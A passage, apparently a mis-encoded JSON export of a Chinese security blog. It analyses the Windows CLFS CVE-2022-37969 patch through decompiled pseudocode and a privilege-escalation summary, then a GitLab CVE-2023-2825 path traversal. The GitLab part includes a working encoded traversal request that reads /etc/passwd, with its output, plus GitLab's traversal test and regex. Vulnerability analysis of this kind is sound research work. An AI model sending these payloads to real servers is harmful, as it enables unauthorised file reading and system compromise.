(int)Feature_Servicing_41154973__private_IsEnabled() ) { **if ( *(_DWORD *)(v10 + 0x68) \u0026gt; *(unsigned __int16 *)(v10 + 4) \u0026lt;\u0026lt; 9 )// SignatureOffset { v20 = -1072037875; v73 = -1072037875; goto LABEL_146; } if ( (int)ULongLongAdd((unsigned __int64)BaseLogRecord + 0x1338, *((unsigned int *)BaseLogRecord + 0x4CA), \u0026amp;v91) \u0026lt; 0 || (int)ULongLongAdd(v10, v21, \u0026amp;v90) \u0026lt; 0// å°†BASE_RECORD_HEADERå’ŒcbSymbolZoneç›¸åŠ  || v91 \u0026gt; v90 )** { v20 = -1072037875; v73 = -1072037875; goto LABEL_146; } } Src = (char *)BaseLogRecord + 808; v79 = CClfsBaseFile::ContainerCount(this); v22 = 0; while ( v11 \u0026lt; 0x400 ) { v17 = (CClfsContainer *)v11; åœ¨CClfsBaseFile::GetSymbolä¸­å¢åŠ äº†å¯¹Client Context çš„æ£€æŸ¥ï¼ŒéªŒè¯æ˜¯å¦æ˜¯æ­£ç¡®çš„Client Context\n__int64 __fastcall CClfsBaseFile::GetSymbol( PERESOURCE *this, unsigned int a2, char a3, struct _CLFS_CLIENT_CONTEXT **a4) { ... if ( !v11 ) goto LABEL_12; if ( *(v11 - 3) != a2 ) { v8 = -1073741816; LABEL_13: v16 = v8; goto LABEL_14; } v12 = ClfsQuadAlign(0x88u); **if ( *((_DWORD *)v13 - 4) != (unsigned __int64)(v15 + v12)// éªŒè¯Client Contextä¸Šä¸‹æ–‡ || *(_DWORD *)v13 != -1040322553 || *((_DWORD *)v13 + 1) != v14 || *((_BYTE *)v13 + 8) != a3** ) { LABEL_12: v8 = -1072037875; goto LABEL_13; } *a4 = v13; WIN11\nwin11ä¸Šè¡¥ä¸ä¸»è¦æ–°å¢äº†ä»¥ä¸‹å‡ ä¸ªå‡½æ•°\nCClfsBaseFile::AllocOffsetNode(_RTL_AVL_TABLE *,ulong) CClfsBaseFile::CompareGenericoffsets(_RTL_AVL_TABLE *,void *,void *) CClfsBaseFile::ValidateCheckifWithinSymbolZone(ulong,_CLFS_BASE_RECORD_HEADER *) CClfsBaseFile::ValidateClientContextOffsets(_CLFS_VALIDATE_OFFSET_TABLE *,_CLFS_BASE_RECORD_HEADER * const) CClfsBaseFile::ValidateClientSymTblOffsets(_CLFS_VALIDATE_OFFSET_TABLE *,_CLFS_BASE_RECORD_HEADER * const) CClfsBaseFile::ValidateContainerSymTblOffsets(_CLFS_VALIDATE_OFFSET_TABLE *,_CLFS_BASE_RECORD_HEADER * const) CClfsBaseFile::ValidateProcessQNode(_CLFS_VALIDATE_OFFSET_TABLE *,_CLFS_BASE_RECORD_HEADER * const,ulong,ulong \u0026amp;,ulong \u0026amp;) ä»CClfsBaseFilePersisted::LoadContainerQ å‡½æ•°å¼€å§‹è°ƒç”¨å †æ ˆä¸ºï¼š\nCClfsBaseFilePersisted::LoadContainerQâ†’CClfsBaseFile::ValidateOffsetsâ†’CClfsBaseFile::ValidateClientContextOffsetsâ†’CClfsBaseFile::ValidateCheckifWithinSymbolZone\nå‡½æ•°CClfsBaseFile::ValidateOffsets ä¼ªä»£ç å¦‚ä¸‹ï¼š\n__int64 __fastcall CClfsBaseFile::ValidateOffsets(CClfsBaseFile *this, struct _CLFS_BASE_RECORD_HEADER *const a2) { char v4; // r13 unsigned __int64 v5; // rbx struct _RTL_AVL_TABLE *TableContext; // rax struct _CLFS_VALIDATE_OFFSET_TABLE *v7; // rdi ...... v4 = 0; v5 = *(_QWORD *)(*((_QWORD *)this + 6) + 48i64); TableContext = (struct _RTL_AVL_TABLE *)ExAllocatePoolWithTag(PagedPool, 0x68ui64, 0x73666C43u); v7 = (struct _CLFS_VALIDATE_OFFSET_TABLE *)TableContext; if ( !TableContext ) return 3221225626i64; RtlInitializeGenericTableAvl( TableContext, CClfsBaseFile::CompareGenericoffsets, CClfsBaseFile::AllocOffsetNode, CClfsLogFcbPhysical::ReleaseLsnMap, TableContext); v9 = *(unsigned int *)(v5 + 104); if ( (unsigned int)v9 \u0026gt; *(unsigned __int16 *)(v5 + 4) \u0026lt;\u0026lt; 9 ) goto LABEL_25; v10 = (char *)a2 + *((unsigned int *)a2 + 1226) + 4920; if ( v10 \u0026lt; (char *)a2 + 4920 || v5 + v9 \u0026lt; v5 || (unsigned __int64)v10 \u0026gt; v5 + v9 ) goto LABEL_25; v11 = CClfsBaseFile::ValidateContainerContextOffsets(this, v7, a2); **if ( v11 \u0026lt; 0 || (v11 = CClfsBaseFile::ValidateClientContextOffsets(this, (struct _RTL_AVL_TABLE *)v7, a2), v11 \u0026lt; 0) || (v11 = CClfsBaseFile::ValidateContainerSymTblOffsets(this, v7, a2), v11 \u0026lt; 0) || (v11 = CClfsBaseFile::ValidateClientSymTblOffsets(this, v7, a2), v11 \u0026lt; 0) )** { LABEL_26: ..... LABEL_35: ExFreePoolWithTag(v7, 0); return (unsigned int)v11; } è¯¥ä»£ç ä¸­é€šè¿‡è°ƒç”¨CClfsBaseFile::ValidateClientContextOffsets CClfsBaseFile::ValidateClientSymTblOffsets CClfsBaseFile::ValidateContainerSymTblOffsetsæ£€æŸ¥Client Context Offsetã€Container Sybbol Tableç­‰åç§»æ˜¯å¦åˆæ³•ã€‚\nCClfsBaseFile::ValidateClientContextOffsetsä¼ªä»£ç å¦‚ä¸‹ï¼Œè¯¥ä»£ç å¾ªç¯éå†æ£€æŸ¥æ¯ä¸ªContainerå¹¶è°ƒç”¨CClfsBaseFile::ValidateCheckifWithinSymbolZoneæ£€æŸ¥cbSymbolZoneæ˜¯å¦åˆæ³•ã€‚\n__int64 __fastcall CClfsBaseFile::ValidateClientContextOffsets( CClfsBaseFile *this, struct _RTL_AVL_TABLE *a2, struct _CLFS_BASE_RECORD_HEADER *const a3) { int Symbol; // ebx int v4; // r14d __int64 v5; // rdi unsigned int v8; // esi CClfsBaseFile *v9; // rcx struct _CLFS_BASE_RECORD_HEADER *v10; // r8 ..... do { v8 = *((_DWORD *)a3 + v5 + 78); if ( v8 - 1 \u0026lt;= 0xFFFFFFFD ) { ++v4; Symbol = CClfsBaseFile::ValidateCheckifWithinSymbolZone(this, v8 + 135, a3); if ( Symbol \u0026lt; 0 ) goto LABEL_15; Symbol = CClfsBaseFile::ValidateCheckifWithinSymbolZone(v9, v8 - 48, v10); if ( Symbol \u0026lt; 0 ) goto LABEL_15; v11 = CClfsBaseFile::OffsetToAddr(this, v8); if ( !v11 ) goto LABEL_15; v12 = *(v11 - 3); if ( v12 != v8 ) goto LABEL_15; if ( *(v11 - 4) != v12 + 136 ) goto LABEL_15; v19 = 0i64; Symbol = CClfsBaseFile::GetSymbol(this, v8, v5, \u0026amp;v19); if ( Symbol \u0026lt; 0 ) goto LABEL_15; if ( *((unsigned __int8 *)v19 + 8) != (_DWORD)v5 ) goto LABEL_15; if ( *(_DWORD *)v19 != -1040322553 ) goto LABEL_15; Buffer = *((_DWORD *)a3 + v5 + 78) - 48; inserted = RtlInsertElementGenericTableAvl(a2, \u0026amp;Buffer, 8u, \u0026amp;NewElement); if ( !NewElement || !inserted ) goto LABEL_15; } v5 = (unsigned int)(v5 + 1); } while ( (unsigned int)v5 \u0026lt; 0x7C ); if ( v4 != CClfsBaseFile::ClientCount(this) ) { ...... return (unsigned int)Symbol; } CClfsBaseFile::ValidateCheckifWithinSymbolZoneå‡½æ•°æ£€æŸ¥cbSymbolZoneåç§»æ˜¯å¦å¤„äºæ”¿ç­–èŒƒå›´å†…ï¼ˆå¤„äºBASE_RECORD_HEADERå’ŒBASE_RECORDä¹‹é—´ï¼‰\n__int64 __fastcall CClfsBaseFile::ValidateCheckifWithinSymbolZone( CClfsBaseFile *this, unsigned int a2, struct _CLFS_BASE_RECORD_HEADER *a3) { if ( a2 \u0026lt; 0x1338 || a2 - 4920 \u0026gt; *((_DWORD *)a3 + 1226) ) return 3222929421i64; else return 0i64; } å°ç»“ è¿™æ¬¡æ¼æ´çš„é€ æˆåŸå› æ˜¯è‡ªèº«çš„SignatureOffsetå’Œè‡ªèº«çš„Signaturesç›¸äº¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å¾ªç¯å†™å…¥Signaturesçš„æ—¶å€™è¦†ç›–SignatureOffsetï¼Œä»è€Œç»•è¿‡ResetLogä¸­çš„è¾¹ç•Œæ£€æŸ¥ï¼ŒåŒæ—¶æœªæ£€æŸ¥BASE_RECORD_HEADER + cbSymbolZoneæ˜¯å¦ä½äºå½“å‰çš„BASE_RECORDä¸­ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¼æ´é€šè¿‡memsetå‡½æ•°å¯¹ä»»æ„åœ°å€çš„ä¸€å®šå¤§å°çš„å†…å­˜è¿›è¡Œæ¸…é›¶ã€‚\nåœ¨å®é™…åˆ©ç”¨ä¸­é€šè¿‡æ¸…é›¶pContaineræŒ‡é’ˆçš„é«˜äº”ä½åŒæ—¶åœ¨ç”¨æˆ·å±‚é€šè¿‡å †å¸ƒå±€ä¼ªé€ CClfsContainerå¯¹è±¡ï¼Œåœ¨è§£å¼•ç”¨å¯¹è±¡æŒ‡é’ˆæ—¶è·å–åˆ°æ‰§è¡Œä»£ç çš„æ—¶æœºã€‚é€šè¿‡ç»“åˆPipeå¯¹è±¡å’Œå†…æ ¸çš„ä¸¤ä¸ªå‡½æ•°æˆåŠŸè·å¾—ä»»æ„è¯»å’Œä»»æ„å†™ï¼Œä»è€ŒæˆåŠŸå°†å½“å‰è¿›ç¨‹çš„Tokenæ›¿æ¢æˆç³»ç»Ÿè¿›ç¨‹çš„tokenï¼Œè¾¾æˆææƒã€‚åˆ©ç”¨è¿‡ç¨‹\nåœ¨æ¼æ´è¡¥ä¸ä¸­å¢åŠ äº†å¯¹cbSymbolZoneå’ŒClient Contextçš„æ£€æŸ¥ä»è€Œåœ¨æ¼æ´åˆ©ç”¨åˆæœŸé˜»æ–­ã€‚\næ€»çš„æ¥è¯´è¯¥æ¼æ´å½¢æˆåŸå› æ˜¯ä»£ç è°ƒç”¨æŸäº›å‡½æ•°æ—¶æœªæ£€æŸ¥è¾¹ç•Œä¸”è¯¥è¾¹ç•Œç”¨æˆ·å¯æ§æˆ–é—´æ¥å¯æ§ã€‚\nå‚è€ƒé“¾æ¥\nhttps://github.com/fortra/CVE-2022-37969\nhttps://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis\nhttps://mp.weixin.qq.com/s/GMzbavzltM756Fb8lw6h_A\nhttps://bbs.kanxue.com/thread-275566.htm#msg_header_h3_0\nhttps://www.geoffchappell.com/\nhttps://github.com/ionescu007/clfs-docs\nhttps://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf\nhttps://www.52pojie.cn/thread-1817452-1-1.html\nCreated at 2023-05-26T10:56:00+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/","title":"CVE-2023-2825 Gitlab è·¯å¾„ç©¿è¶Šæ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ åœ¨GitLab ä¸­ï¼Œå½“ä¸€ä¸ªé™„ä»¶å­˜åœ¨äºä¸€ä¸ªé¡¹ç›®ä¸­ï¼Œå¹¶ä¸”è¯¥é¡¹ç›®åœ¨åµŒå¥—äº†è‡³å°‘äº”å±‚çš„ç»„å†…ï¼Œæ”»å‡»è€…æ‰å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œè¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚\nå½±å“ç‰ˆæœ¬ GitLab 16.0.0\nç¯å¢ƒæ­å»º ç”¨dockerèµ·ç¯å¢ƒ\ndocker pull gitlab/gitlab-ce:16.0.0-ce.0 docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0 æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯æ™®é€šçš„ç›®å½•ç©¿è¶Šï¼Œå…ˆdiffçœ‹æ€ä¹ˆä¿®çš„ï¼Œæ³¨æ„åˆ°16.0.1æ–°å¢äº†spec\\support\\shared_examples\\requests\\uploads_actions_shared_examples.rb æ–‡ä»¶ã€‚\næ ¹æ®è¯¥æ–‡ä»¶å†…å®¹åˆ¤æ–­åº”è¯¥æ˜¯è¿™ä¸ªæ¼æ´çš„å•å…ƒæµ‹è¯•æ–‡ä»¶ï¼Œæ²¡å­¦è¿‡rubyï¼Œå…ˆæŠŠè¿™æ®µä»£ç æ‰”ç»™ChatGPTçœ‹çœ‹\n# frozen_string_literal: true RSpec.shared_examples \u0026#39;uploads actions\u0026#39; do describe \u0026#34;GET #show\u0026#34; do context \u0026#39;with file traversal in filename parameter\u0026#39; do # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET let(:filename) { \u0026#34;../../../../../../../../../Gemfile.lock\u0026#34; } let(:escaped_filename) { CGI.escape filename } it \u0026#39;responds with status 400\u0026#39; do # Check files do indeed exists upload_absolute_path = Pathname(upload.absolute_path) expect(upload_absolute_path).to be_exist attacked_file_path = upload_absolute_path.dirname.join(filename) expect(attacked_file_path).to be_exist # Need to escape, otherwise we get `ActionController::UrlGenerationError Exception: No route matches` get show_path.sub(File.basename(upload.path), escaped_filename) expect(response).to have_gitlab_http_status(:bad_request) end end end end ChatGPTå›ç­”ï¼š\nè¿™æ®µRubyä»£ç å®šä¹‰äº†ä¸€ä¸ªRSpecå…±äº«ç¤ºä¾‹ï¼Œåä¸ºâ€œuploads actionsâ€ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹ã€‚è¿™ä¸ªæµ‹è¯•ç”¨ä¾‹æµ‹è¯•äº†åœ¨æ–‡ä»¶åå‚æ•°ä¸­å‘ç”Ÿæ–‡ä»¶éå†æ”»å‡»æ—¶æœåŠ¡å™¨çš„å“åº”è¡Œä¸ºã€‚ åœ¨æµ‹è¯•ç”¨ä¾‹ä¸­ï¼Œé¦–å…ˆå®šä¹‰äº†ä¸¤ä¸ªå˜é‡ï¼šfilenameå’Œescaped_filenameã€‚filenameå˜é‡æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒä»£è¡¨å°†è¢«æ”»å‡»çš„æ–‡ä»¶åã€‚escaped_filenameå˜é‡æ˜¯å¯¹filenameè¿›è¡ŒURLç¼–ç åçš„ç»“æœï¼Œè¿™æ˜¯ä¸ºäº†é¿å…è¯·æ±‚URLä¸­ä½¿ç”¨ä¸å®‰å…¨çš„å­—ç¬¦å¯èƒ½ä¼šå¯¼è‡´æ„å¤–çš„ç»“æœã€‚ ç„¶åï¼Œè¯¥æµ‹è¯•ç”¨ä¾‹æ£€æŸ¥ä¸Šä¼ çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œä¹‹åæ„é€ ä¸€ä¸ªæ¶æ„URLè¯·æ±‚æ¥æ‰§è¡Œæ–‡ä»¶éå†æ”»å‡»ï¼Œè¯·æ±‚ä¸€ä¸ªéæ³•æ–‡ä»¶ã€‚å…·ä½“è€Œè¨€ï¼Œå®ƒä½¿ç”¨Pathnameç±»æ¥è·å–ä¸Šä¼ æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œç„¶åä½¿ç”¨File.basenameå’ŒString#subæ–¹æ³•æ¥æ„é€ æ¶æ„URLè¯·æ±‚ã€‚æœ€åï¼Œä½¿ç”¨RSpecçš„expectè¯­å¥æ¥æ£€æŸ¥æœåŠ¡å™¨çš„å“åº”çŠ¶æ€ç æ˜¯å¦ä¸º400ï¼ˆbad_requestï¼‰ã€‚ æ€»ä¹‹ï¼Œè¿™ä¸ªRSpecå…±äº«ç¤ºä¾‹æµ‹è¯•äº†æœåŠ¡å™¨æ˜¯å¦èƒ½å¤Ÿé˜²æ­¢æ–‡ä»¶éå†æ”»å‡»ï¼Œå¹¶æ­£ç¡®åœ°å¤„ç†æ¶æ„è¯·æ±‚ã€‚ æ ¹æ®æœ‰é™çš„çŸ¥è¯†ç»“åˆChatGPTå›ç­”ï¼Œå¯ä»¥çŸ¥é“è¿™æ®µä»£ç é¦–å…ˆå®šä¹‰äº†ç›®å½•ç©¿è¶Šçš„payloadï¼š../../../../../../../../../Gemfile.lock è€Œåå°†å…¶è¿›è¡Œurlç¼–ç å¹¶èµ‹å€¼ç»™escaped_filenameã€‚\nä¹‹åå°†ä¸Šä¼ ç›®å½•çš„è·¯å¾„å’Œè¿™ä¸ªpayloadæ‹¼æ¥å¹¶åˆ¤æ–­è¿™ä¸ªè·¯å¾„æ˜¯å¦å­˜åœ¨ã€‚ä¹‹åé€šè¿‡String.subå‡½æ•°å°†ä¸Šä¼ è·¯å¾„çš„æ–‡ä»¶åæ›¿æ¢æˆäº†escaped_filenameï¼Œå¹¶ç”¨RSpec æ¡†æ¶çš„getå‡½æ•°å‘èµ·è¯·æ±‚ã€‚\nç»“åˆè¯¥å•å…ƒæµ‹è¯•çš„æ³¨é‡Šï¼Œå¯ä»¥çŸ¥é“ï¼Œå¤§æ¦‚payloadå¦‚ä¸‹\n/url/to/upload/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FGemfile%2Elock # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET åœ¨é€šè¿‡å®˜æ–¹æ–‡æ¡£çŸ¥é“å¦‚ä½•é€šè¿‡APIä¸Šä¼ é™„ä»¶\ncurl --request POST --header \u0026#34;PRIVATE-TOKEN: \u0026lt;your_access_token\u0026gt;\u0026#34; \\ --form \u0026#34;file=@dk.png\u0026#34; \u0026#34;https://gitlab.example.com/api/v4/projects/5/uploads\u0026#34; https://github.com/gitlabhq/gitlabhq/blob/master/doc/api/projects.md#upload-a-file\nè¿™é‡Œå…ˆç”¨Administratorä¸Šä¼ ä¸€ä¸ªé™„ä»¶çœ‹çœ‹ï¼ˆå·²æå‰å»ºå¥½ç›¸åº”çš„ç»„å’Œé¡¹ç›®ï¼‰\n$ curl --request POST --header \u0026#34;PRIVATE-TOKEN: glpat-Py3rEGA_SPngPn-2LzsR\u0026#34; --form \u0026#34;file=@3.txt\u0026#34; \u0026#34;http://192.168.59.197/api/v4/projects/g1%2Fg2%2Fg3%2Fg4%2Fg5%2Fg6%2Fg7%2Fg8%2Fg9%2Fp4/uploads\u0026#34; {\u0026#34;alt\u0026#34;:\u0026#34;3.txt\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt\u0026#34;,\u0026#34;full_pat h\u0026#34;:\u0026#34;/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/3.tx t\u0026#34;,\u0026#34;markdown\u0026#34;:\u0026#34;[3.txt](/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt)\u0026#34;} å¯ä»¥çœ‹åˆ°å·²ç»è¿”å›äº†ä¸€ä¸ªurlï¼Œä¸éš¾çœ‹å‡ºå’Œå•å…ƒæµ‹è¯•é‡Œé¢çš„æ³¨é‡Šçš„è·¯å¾„é•¿å¾—å¾ˆåƒï¼Œè¿™é‡Œç”¨è‡ªå·±çš„payloadæ›¿æ¢3.txt\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2fpasswd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi n nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh åˆ†æ\nåˆ°ç°åœ¨æœ‰ä¸¤ä¸ªé—®é¢˜\nä¸ºä»€ä¹ˆè¦æ±‚payloadéœ€è¦ç»è¿‡urlç¼–ç  ä¸ºä»€ä¹ˆè¦12ä¸ªç©¿è¶Šç¬¦æ‰èƒ½åˆ°æ ¹ç›®å½• åœ¨å“ªä¸ªä»£ç è§¦å‘çš„æ¼æ´ é¦–å…ˆæ˜¯ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒGitLabæ¶æ„ä¸ºnginx â†”Workhorseâ†”pumaï¼Œèµ·åˆä»¥ä¸ºå°†ç›®å½•ç©¿è¶Šè¿›è¡Œurlç¼–ç æ˜¯ç»•è¿‡nginxè§£æï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå½“è®¿é—®/1/2/3/4/5/6/../../../index.phpæ—¶nginxå®é™…ä¼šè®¿é—®/1/2/3/index.phpï¼Œå³ä¼šè¿›è¡Œæ‹¼æ¥ç„¶åè®¿é—®ï¼Œæ‰€ä»¥ä¸€å¼€å§‹åˆ¤æ–­çš„æ˜¯å°†payloadè¿›è¡Œurlç¼–ç ç»•è¿‡è¿™ä¸ªè¿‡ç¨‹ï¼Œè€Œåå’Œå…¶ä»–å¸ˆå‚…è®¨è®ºæ‰å‘ç°ï¼Œè™½ç„¶å°†payloadè¿›è¡Œç¼–ç ä½†nginxä¼šå°†urlé‡Œé¢urlç¼–ç çš„éƒ¨åˆ†è¿›è¡Œè§£ç ç„¶åæ‹¼æ¥ï¼Œæ‰€ä»¥urlç¼–ç ä¸æ˜¯ä¸ºäº†ç»•è¿‡nginxè§£æã€‚åœ¨å‰é¢ä½¿ç”¨apiä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œæ–‡æ¡£ç‰¹åˆ«å¼ºè°ƒäº†ä¸Šä¼ ç›®æ ‡è·¯å¾„éœ€è¦è¿›è¡Œurlç¼–ç ï¼Œè¿™é‡Œæ¨æµ‹åº”è¯¥æ˜¯GitLabå†…ä¼šè¿›è¡Œurlè§£ç åœ¨è¿›è¡Œå¤„ç†ã€‚\nç¬¬äºŒä¸ªé—®é¢˜ä¸ºä»€ä¹ˆéœ€è¦12ä¸ªç©¿è¶Šç¬¦ï¼Œç»è¿‡æµ‹è¯•å‘ç°æ–‡ä»¶å®é™…ä¸Šä¼ åœ¨/var/opt/gitlab/gitlab-rails/uploads/@hashed ç›®å½•ä¸‹ï¼Œä½†åœ¨ä»£ç ä¸­ä½¿ç”¨çš„æ˜¯/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/ å…¶ä¸­uploadsè½¯è¿æ¥åˆ°äº†/var/opt/gitlab/gitlab-rails/uploadsç›®å½•ï¼Œåœ¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åï¼Œæ–‡ä»¶è·¯å¾„ä¸º/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a/34c2b7fc66dcfbfe0b65513260ad0510/3.txt ä¸éš¾çœ‹å‡ºå…±æœ‰12å±‚ç›®å½•æ‰€ä»¥éœ€è¦12ä¸ªç©¿è¶Šç¬¦ï¼Œåœ¨è§¦å‘æ¼æ´æ—¶urlä¸º/path/to/group/project/uploads/@hashedï¼Œç»“åˆç»•è¿‡nginxè§£æï¼Œæ‰€ä»¥è‡³å°‘éœ€è¦9ä¸ªç»„æ‰èƒ½æœ‰è¶³å¤Ÿçš„åµŒå¥—å±‚æ•°ç»•è¿‡nginxçš„urlè§£æã€‚\nç¬¬ä¸‰ä¸ªé—®é¢˜ï¼Œå›åˆ°è¡¥ä¸å¯¹æ¯”ï¼Œè¡¥ä¸ä¸»è¦åœ¨ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶æ·»åŠ äº†é˜²æŠ¤ç›®å½•ç©¿è¶Šçš„ä»£ç ï¼Œåœ¨showæ–¹æ³•å¤„å¯¹filenameè¿›è¡Œurlè§£ç è€Œåè°ƒç”¨ Gitlab::Utils.check_path_traversal!(params[:filename]) æ£€æŸ¥urlè§£ç åçš„å‚æ•°æ˜¯å¦å­˜åœ¨ç›®å½•ç©¿è¶Šã€‚\napp\\uploaders\\object_storage.rb def retrieve_from_store!(identifier) Gitlab::Utils.check_path_traversal!(identifier) # We need to force assign the value of @filename so that we will still # get the original_filename in cases wherein the file points to a random generated # path format. This happens for direct uploaded files to final location. # # If we don\u0026#39;t set @filename value here, the result of uploader.filename (see ObjectStorage#filename) will result # to the value of uploader.file.filename which will then contain the random generated path. # The `identifier` variable contains the value of the `file` column which is the original_filename. # # In cases wherein we are not uploading to final location, it is still fine to set the # @filename with the `identifier` value because it still contains the original filename from the `file` column, # which is what we want in either case. @filename = identifier # rubocop: disable Gitlab/ModuleWithInstanceVariables super end private app\\controllers\\concerns\\uploads_actions.rb def show Gitlab::Utils.check_path_traversal!(params[:filename]) return render_404 unless uploader\u0026amp;.exists? ttl, directives = *cache_settings ttl ||= 0 directives ||= { private: true, must_revalidate: true } expires_in ttl, directives file_uploader = [uploader, *uploader.versions.values].find do |version| version.filename == params[:filename] end return render_404 unless file_uploader workhorse_set_content_type! send_upload(file_uploader, attachment: file_uploader.filename, disposition: content_disposition) end å†æ¥çœ‹Gitlab::Utils.check_path_traversalå‡½æ•°ï¼Œå…¶å®šä¹‰åœ¨lib\\gitlab\\utils.rb\ndef check_path_traversal!(path) return unless path path = path.to_s if path.is_a?(Gitlab::HashedPath) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; unless path.is_a?(String) path = decode_path(path) path_regex = %r{(\\A(\\.{1,2})\\z|\\A\\.\\.[/\\\\]|[/\\\\]\\.\\.\\z|[/\\\\]\\.\\.[/\\\\]|\\n)} if path.match?(path_regex) logger.warn(message: \u0026#34;Potential path traversal attempt detected\u0026#34;, path: \u0026#34;#{path}\u0026#34;) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; end path end è¿™ä¸ªå‡½æ•°æ¥æ”¶ä¸€ä¸ªè·¯å¾„ï¼Œè€Œåç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…åˆ°äº†åˆ™æŠ›å‡ºPathTraversalAttackError é”™è¯¯ï¼ŒæŠŠè¿™æ®µæ­£åˆ™è¡¨è¾¾å¼ç»™ChatGPTï¼Œç»™å‡ºäº†å¦‚ä¸‹è§£é‡Šï¼Œæ‰€ä»¥ä»£ç è°ƒç”¨è¿™ä¸ªå‡½æ•°å¯ä»¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¶æ„çš„ç›®å½•ç©¿è¶Šã€‚\nè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¹Ÿæ˜¯ç”¨æ¥åŒ¹é…æ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²ä¸­çš„ç›¸å¯¹è·¯å¾„ï¼ˆå¦‚\u0026#34;./\u0026#34;ã€\u0026#34;../\u0026#34;ç­‰ï¼‰çš„ï¼Œå®ƒçš„å«ä¹‰ä¸å‰ä¸€ä¸ªé—®é¢˜ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯ä½¿ç”¨äº†ä¸åŒçš„è¯­æ³•æ¥è¡¨ç¤ºç›¸åŒçš„å«ä¹‰ã€‚å…·ä½“æ¥è¯´ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„å«ä¹‰å¦‚ä¸‹ï¼š json \\A åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´ (.{1,2}) 